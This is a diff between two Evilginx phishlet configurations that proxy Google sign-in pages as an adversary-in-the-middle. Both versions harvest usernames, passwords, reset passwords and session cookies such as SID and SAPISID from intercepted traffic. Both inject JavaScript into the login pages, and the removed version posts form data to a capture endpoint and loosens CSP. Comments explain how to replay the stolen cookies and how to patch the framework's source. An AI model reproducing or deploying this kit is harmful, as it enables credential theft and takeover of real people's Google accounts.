@@ -1,317 +1,165 @@
-# Configuration for phishing framework (e.g., Evilginx)
-# Author: drealdeal650@gmail.com
-# Coded by: drealdeal650@gmail.com
-# Credit to: drealdeal650@gmail.com
-# Minimum Version: Updated for 2025 framework compatibility
-min_ver: '3.0.0'
+name: 'Google'
+author: '@an0nud4y'
+min_ver: '2.3.0'
 
-# Proxy Hosts Configuration
 proxy_hosts:
-  # Google Core Services
-  - phish_sub: 'www'
-    orig_sub: 'www'
-    domain: 'google.com'
-    session: false
-    is_landing: false
-    auto_filter: false
-  - phish_sub: 'accounts'
-    orig_sub: 'accounts'
-    domain: 'google.com'
-    session: true
-    is_landing: true
-    auto_filter: false
-  - phish_sub: 'myaccount'
-    orig_sub: 'myaccount'
-    domain: 'google.com'
-    session: true
-    is_landing: false
-    auto_filter: false
-  - phish_sub: 'play'
-    orig_sub: 'play'
-    domain: 'google.com'
-    session: false
-    is_landing: false
-    auto_filter: false
-  - phish_sub: 'cloud'  # Added for Google Cloud (2025 relevance)
-    orig_sub: 'cloud'
-    domain: 'google.com'
-    session: true
-    is_landing: false
-    auto_filter: false
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
 
-  # Google Static and API Services
-  - phish_sub: 'ssl'
-    orig_sub: 'ssl'
-    domain: 'gstatic.com'
-    session: false
-    is_landing: false
-    auto_filter: false
-  - phish_sub: 'content'
-    orig_sub: 'content'
-    domain: 'googleapis.com'
-    session: false
-    is_landing: false
-    auto_filter: false
-
-  # YouTube Services
-  - phish_sub: 'accounts'
-    orig_sub: 'accounts'
-    domain: 'youtube.com'
-    session: true
-    is_landing: false
-    auto_filter: false
-  - phish_sub: 'premium'  # Added for YouTube Premium
-    orig_sub: 'premium'
-    domain: 'youtube.com'
-    session: true
-    is_landing: false
-    auto_filter: false
 
 sub_filters:
-  # Filters for accounts.google.com (primary login domain)
-  - triggers_on: 'accounts.google.com'
-    orig_sub: 'accounts'
-    domain: 'google.com'
-    search: 'https://accounts.google.com'
-    replace: 'https://{hostname}'
-    mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']
-  - triggers_on: 'accounts.google.com'
-    orig_sub: 'accounts'
-    domain: 'google.com'
-    search: 'https%3A%2F%2Faccounts.google.com%2F'
-    replace: 'https%3A%2F%2F{hostname}%2F'
-    mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']
-  - triggers_on: 'accounts.google.com'
-    orig_sub: 'accounts'
-    domain: 'google.com'
-    search: 'google.com'
-    replace: '{basedomain}'
-    mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']
-
-  # Filters for myaccount.google.com
-  - triggers_on: 'myaccount.google.com'
-    orig_sub: 'myaccount'
-    domain: 'google.com'
-    search: 'https://myaccount.google.com'
-    replace: 'https://myaccount.{basedomain}'
-    mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']
-  - triggers_on: 'myaccount.google.com'
-    orig_sub: 'myaccount'
-    domain: 'google.com'
-    search: 'https%3A%2F%2Fmyaccount.google.com%2F'
-    replace: 'https%3A%2F%2Fmyaccount.{basedomain}%2F'
-    mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']
-  - triggers_on: 'myaccount.google.com'
-    orig_sub: 'myaccount'
-    domain: 'google.com'
-    search: 'google.com'
-    replace: '{basedomain}'
-    mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']
-
-  # Filters for cloud.google.com
-  - triggers_on: 'cloud.google.com'
-    orig_sub: 'cloud'
-    domain: 'google.com'
-    search: 'https://cloud.google.com'
-    replace: 'https://cloud.{basedomain}'
-    mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']
-  - triggers_on: 'cloud.google.com'
-    orig_sub: 'cloud'
-    domain: 'google.com'
-    search: 'https%3A%2F%2Fcloud.google.com%2F'
-    replace: 'https%3A%2F%2Fcloud.{basedomain}%2F'
-    mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']
-  - triggers_on: 'cloud.google.com'
-    orig_sub: 'cloud'
-    domain: 'google.com'
-    search: 'google.com'
-    replace: '{basedomain}'
-    mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']
-
-  # Filters for accounts.youtube.com
-  - triggers_on: 'accounts.youtube.com'
-    orig_sub: 'accounts'
-    domain: 'youtube.com'
-    search: 'https://accounts.youtube.com'
-    replace: 'https://accounts.{basedomain}'
-    mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']
-  - triggers_on: 'accounts.youtube.com'
-    orig_sub: 'accounts'
-    domain: 'youtube.com'
-    search: 'https%3A%2F%2Faccounts.youtube.com%2F'
-    replace: 'https%3A%2F%2Faccounts.{basedomain}%2F'
-    mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']
-  - triggers_on: 'accounts.youtube.com'
-    orig_sub: 'accounts'
-    domain: 'youtube.com'
-    search: 'youtube.com'
-    replace: '{basedomain}'
-    mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']
-
-  # Filters for premium.youtube.com
-  - triggers_on: 'premium.youtube.com'
-    orig_sub: 'premium'
-    domain: 'youtube.com'
-    search: 'https://premium.youtube.com'
-    replace: 'https://premium.{basedomain}'
-    mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']
-  - triggers_on: 'premium.youtube.com'
-    orig_sub: 'premium'
-    domain: 'youtube.com'
-    search: 'https%3A%2F%2Fpremium.youtube.com%2F'
-    replace: 'https%3A%2F%2Fpremium.{basedomain}%2F'
-    mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']
-  - triggers_on: 'premium.youtube.com'
-    orig_sub: 'premium'
-    domain: 'youtube.com'
-    search: 'youtube.com'
-    replace: '{basedomain}'
-    mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']
+# (In case js_inject don't works) Redirect on desired url (replace targetDomain) if successful login occurs by detecting valid session cookies
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>var redirectCount=0,maxRedirects=3,targetDomain="https://google.com";function checkCookies(){document.cookie.includes("SID")&&document.cookie.includes("APISID")&&document.cookie.includes("SAPISID")?window.location.hostname!==targetDomain?window.location.href=targetDomain:cancelAnimationFrame(animationId):++redirectCount>=maxRedirects&&cancelAnimationFrame(animationId)}document.addEventListener("DOMContentLoaded",(function(){checkCookies(),animationId=requestAnimationFrame((function e(){checkCookies(),animationId=requestAnimationFrame(e)}))}));</script></body>', mimes: ['text/html', 'application/json']}
 
 
-# Authentication Tokens
+# Goback if browser not support issues occurs for some reason
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>!function(){function e(){var e=document.body.textContent||document.body.innerText,n=window.location.href.includes("v3/signin/rejected");e.includes("This browser or app may not be secure.")&&n&&(window.location.href="/")}document.addEventListener("DOMContentLoaded",e),window.addEventListener("load",e),setTimeout(e,2e3)}();</script></body>', mimes: ['text/html', 'application/json']}
+
+# Fixing Forget Password Actions
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>var isListenerAdded = false, intervalID = setInterval(() => (!document.body.innerText.includes("You can update your password now if you forgot it.") ? (console.warn("Required text not found. Operations aborted."), isListenerAdded = true) : window.location.href.includes("/changepassword") ? ((button = document.querySelectorAll("button[type=\"button\"]")[1]) && button.innerText === "Update password" ? (console.log("On the way to add Listener ..."), button.addEventListener("click", () => window.location.href.includes("/changepassword") && setTimeout(() => location.reload(), 2000)), console.log("Event listener added to the button."), isListenerAdded = true) : !isListenerAdded ? (console.warn("Button not found. Retrying in 500ms."), setTimeout(() => addButtonEventListener(), 500)) : null) : console.warn("URL does not match. Operations aborted."), isListenerAdded && clearInterval(intervalID)), 500);</script></body>', mimes: ['text/html', 'application/json']}
+  
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html']}
+
+  
 auth_tokens:
   - domain: '.google.com'
-    keys: [".*,regexp"]  # Capture all cookies for google.com
+    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", "OGPC", "OGP", "1P_JAR", "CONSENT", "SMSV", "user_id", ".*,regexp"]
   - domain: 'accounts.google.com'
-    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", ".*", "regexp"]  # Updated for 2025 Google cookies
-  - domain: 'myaccount.google.com'
-    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", ".*", "regexp"]
-  - domain: 'cloud.google.com'
-    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", ".*", "regexp"]  # Added for Google Cloud
-  - domain: 'accounts.youtube.com'
-    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", ".*", "regexp"]
-  - domain: 'premium.youtube.com'
-    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", ".*", "regexp"]  # Added for YouTube Premium
+    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER", ".*,regexp"]
 
-# Credential Capture
-credentials:
-  username:
-    key: 'f.req'
-    search: '\],"([^"]*)"\]$'  # Capture username from POST data
-    type: 'post'
-  password:
-    key: 'f.req'
-    search: ',\["([^"]*)",'  # Capture password from POST data
-    type: 'post'
-  custom:
-    - key: 'useragent'
-      search: '(.*)'
-      type: 'post'
-    - key: 'browser'
-      search: '(.*)'
-      type: 'post'
-    - key: 'engine'
-      search: '(.*)'
-      type: 'post'
-    - key: 'platform'
-      search: '(.*)'
-      type: 'post'
-    - key: 'passkey'  # Added for 2025 passkey support
-      search: '(.*)'
-      type: 'post'
-    - key: 'oauth_token'  # Added for OAuth 2.0 token capture
-      search: '(.*)'
-      type: 'post'
+# Injecting Google Session cookies
+# - Go to google.com
+# - Delete cookies
+# - then import cookies
+# - then refresh and go to account.google.com or mail.google.com
+# - then click on sign in
+# - then insert cookies
+# - and then refresh page and if not logged in insert cookies again and wait for it to automatically detect or refresh.
 
-# Authentication URLs
 auth_urls:
+  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
   - '/CheckCookie'
   - '/ManageAccount'
-  - '/signin/v2/challenge/password'  # Updated for 2025 Google login flow
-  - '/signin/v2/challenge/passkey'  # Added for passkey support
-  - '/o/oauth2/v2/auth'  # Added for OAuth 2.0 flows
+  - '/'
 
-# Login Configuration
-login:
-  domain: 'accounts.google.com'
-  path: '/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en'  # Updated for 2025 login flow
+credentials:
+  username:
+    key: ''
+    search: '\[\[\["V1UmUe","\[null,\\"(.*?)\\"'
+    type: 'post'
+  password:
+    key: ''
+    search: '\[1,1,null,\[1,null,null,null,\[\\"(.*?)\\",null,1\]\]'
+    type: 'post'
+  custom:
+    # Updated_Password after password reset
+    - key: 'f.req'
+      search: '\["gf.siecp","([^"]*)"\]' 
+      type: 'post'
 
-# Force POST Requests
+
+# Force GET - By default evilginx will modify all the domain URLs in GET Parameters which breaks some of the google functionality. Hence we need a Feature FORCE GET same as FORCE POST to modify the GET Parameters on the Fly. This can be also achieved by modifying the proxy.go file code for specific cases, But for generalized implementation Force GET feature would be better solution.
+
+# Get Parameters at below URL GET Requests are also has to be fixed in order to completely fix the google phishlet. For now its performing some redirects to avoid broken requests.
+
+# https://accounts.google.com/SignOutOptions?hl=en&continue=https://myaccount.google.com/%3Fpli%3D1%26utm_source%3Dsign_in_no_continue&ec=GBRAwAE
+# https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Faccounts.google.com%2FManageAccount%3Fnc%3D1&hl=en&checkedDomains=youtube&pstMsg=1&flowName=GlifWebSignIn&ifkv=Af_xneGCEkLu6gkoKlJZTXE3KXLOwxAnakKqQdVySZALt605-KszqbxQ0rMNOFS7KQ-c7oUu8ii5ZQ&chtml=LoginDoneHtml&gidl=EgIIAA
+# At this above url "continue" parameter has to be fixed to original.
+
+# https://accounts.google.com/RotateCookiesPage?og_pid=192&rot=3&origin=https%3A%2F%2Fmyaccount.google.com&exp_id=3701180
+# https://myaccount.google.com/profile-picture?origin=https%3A%2F%2Fmyaccount.google.com&hostId=ma&theme=light
+# https://ogs.google.com/u/0/widget/account?amf=1&sea=1&origin=https%3A%2F%2Fmyaccount.google.com&cn=account&pid=269&spid=192
+# "origin" parameter here
+
+# https://accounts.google.com/v3/signin/_/AccountsSignInUi/jserror?script=https%3A%2F%2Faccounts.google.com%2Fv3%2Fsignin%2Fidentifier%3Fdsh%3DS1191604103%253A1688217227804093%26flowEntry%3DServiceLogin%26flowName%3DGlifWebSignIn%26hl%3Den%26ifkv%3DAeDOFXg67kiWubFUSHU6sApYqZnTZI3YeDi9EZLK57WXacrsipRvu2kFKMGeJjsp-VYVPM6G-uvoCg&error=%24%20is%20not%20defined&line=177
+# "script" parameter here
+
+
 force_post:
-  - path: '/_/signin/sl/challenge'
+# https://accounts.google.com/_/signin/selectchallenge?hl=en&TL=AG7eRGB2-SZJFBR2JnUScncEPZlLcKjbvfkegVpvSE25DnahfIioRPDnf8tCIwGv&_reqid=77650&rt=j
+# https://accounts.google.com/_/signin/challenge?hl=en&TL=AG7eRGB5pPAqRiQLRWrxaZSQVNHcQGXcLXqPPxP-Dr6j-QYlITw9Y2zI-tEww6hl&_reqid=178518&rt=j
+# https://accounts.google.com/_/speedbump/changepassword?hl=en&TL=AG7eRGATorowZWWmA0AKwBrJhabhAmltjCD863PUmrEDR-2topZwstTMwNN4DrPL&_reqid=480805&rt=j
+
+  - path: '/selectchallenge'
     search:
-      - key: 'f.req'
-        search: '.*'
-      - key: 'continue'
-        search: '.*'
-      - key: 'passkey'
-        search: '.*'  # Added for passkey
-      - key: 'oauth_token'
-        search: '.*'  # Added for OAuth
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+      #- {key: 'bghash', search: '.*'}
     force:
-      - key: 'continue'
-        value: ''
-      - key: 'passkey'
-        value: ''  # Added for passkey
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
     type: 'post'
 
-# JavaScript Injection
+  - path: '/signin'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+      - {key: 'bghash', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/speedbump'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+
+
+login:
+  domain: 'accounts.google.com'
+  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+
+
+# To make js_inject work in v3.0 evilginx, Make sure to do these changes (https://github.com/kgretzky/evilginx2/issues/904#issuecomment-1585787426)
+# in file core/phishlet.go on line 909
+# replace line -  re, err := regexp.Compile("^" + d + "$")
+# with line -     re, err := regexp.Compile(d)
+
 js_inject:
-  - trigger_domains: ['accounts.google.com', 'myaccount.google.com', 'cloud.google.com', 'accounts.youtube.com', 'premium.youtube.com']
-    trigger_paths: ['.*?']
+  - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['/' , '/changepassword', '/signin']
     script: |
-      // JavaScript injection for credential capture and modern auth bypass
-      // Author: drealdeal650@gmail.com
-      // Coded by: drealdeal650@gmail.com
-      // Credit to: drealdeal650@gmail.com
-      function serialize(obj) {
-        const str = [];
-        for (const p in obj) {
-          if (obj.hasOwnProperty(p)) {
-            str.push(encodeURIComponent(p) + "=" + encodeURIComponent(obj[p]));
-          }
-        }
-        return str.join("&");
-      }
-
-      // Handle modern Google login form submission (2025 compatibility)
-      window.addEventListener('load', function() {
-        const loginForm = document.getElementById('gaia_loginform') || document.querySelector('form');
-        if (loginForm) {
-          loginForm.addEventListener('submit', function(event) {
-            try {
-              // Capture form data
-              const formData = new FormData(loginForm);
-              const data = {};
-              formData.forEach((value, key) => { data[key] = value; });
-              
-              // Send credentials to phishing server
-              fetch('/capture', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: serialize(data)
-              }).catch(err => console.error('Capture failed:', err));
-
-              // Handle passkey or WebAuthn (2025)
-              if (navigator.credentials) {
-                navigator.credentials.get({ publicKey: {} })
-                  .then(credential => {
-                    if (credential) {
-                      fetch('/capture_passkey', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ passkey: credential.id })
-                      }).catch(err => console.error('Passkey capture failed:', err));
-                    }
-                  })
-                  .catch(err => console.error('WebAuthn error:', err));
-              }
-            } catch (err) {
-              console.error('Form submission error:', err);
+        //----------------Redirection on success login--------------------
+        var redirectCount = 0;
+        var maxRedirects = 3;
+        //var targetDomain = '{redirect-url}';
+        var targetDomain = 'https://google.com'; // Update with the target domain
+        function checkCookies() {
+            if (document.cookie.includes('SID') && document.cookie.includes('APISID') && document.cookie.includes('SAPISID')) {
+                if (window.location.hostname !== targetDomain) {
+                    window.location.href = targetDomain;
+                } else {
+                    cancelAnimationFrame(animationId);
+                }
+            } else {
+                redirectCount++;
+                if (redirectCount >= maxRedirects) {
+                    cancelAnimationFrame(animationId);
+                }
             }
-          });
         }
-
-        // Scroll to sign-in button
-        const signinButton = document.getElementById('next') || document.querySelector('button[type="submit"]');
-        if (signinButton) {
-          signinButton.scrollIntoView({ behavior: 'smooth' });
-        }
-      });
-
-      // Bypass modern CSP (2025 browser compatibility)
-      const meta = document.createElement('meta');
-      meta.httpEquiv = 'Content-Security-Policy';
-      meta.content = 'default-src *; script-src * \'unsafe-inline\'; connect-src *;';
-      document.head.appendChild(meta);
+        document.addEventListener('DOMContentLoaded', function() {
+            // Call the checkCookies function at the start
+            checkCookies();
+            // Continue to call checkCookies before each repaint
+            animationId = requestAnimationFrame(function repeat() {
+                checkCookies();
+                animationId = requestAnimationFrame(repeat);
+            });
+        });
